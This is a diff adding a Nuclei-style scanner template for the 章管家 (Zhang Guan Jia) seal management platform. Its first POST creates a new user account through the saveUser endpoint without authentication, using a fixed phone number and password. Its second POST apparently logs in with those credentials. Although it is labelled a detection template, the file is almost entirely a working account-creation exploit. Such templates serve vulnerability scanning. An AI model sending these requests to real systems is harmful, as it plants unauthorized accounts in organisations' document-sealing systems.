@@ -1,0 +1,44 @@
+id: poc-yaml-shjysoft-zhangin-saveuser-any
+info:
+  name: 章管家 saveuser接口任意用户添加
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    This template detects unauthorized access and potential misuse of the saveUser endpoint in the 章管家 (Zhang Guan Jia) intelligent seal management platform.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/personSeal_jdy/saveUser.htm"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"op":{},"data":{"mobile":"13333333333","uid":"13333333333","password":"123456","name":"testuser","return_url":"https://www.baidu.com","apisecretkey":"1","_id":"1","mail_address":"111@qq.com"},"b7o4ntosbfp":"="}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{\"code\":200}"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/web/checkPhoneAndPwd.htm"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      X-Requested-With: XMLHttpRequest
+    body: |
+      param=%2C49%2C51%2C51%2C51%2C51%2C51%2C51%2C51%2C51%2C51%2C51%2C60%2C62%2C60%2C62%2C49%2C50%2C51%2C52%2C53%2C54
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "188808880"
+        part: body
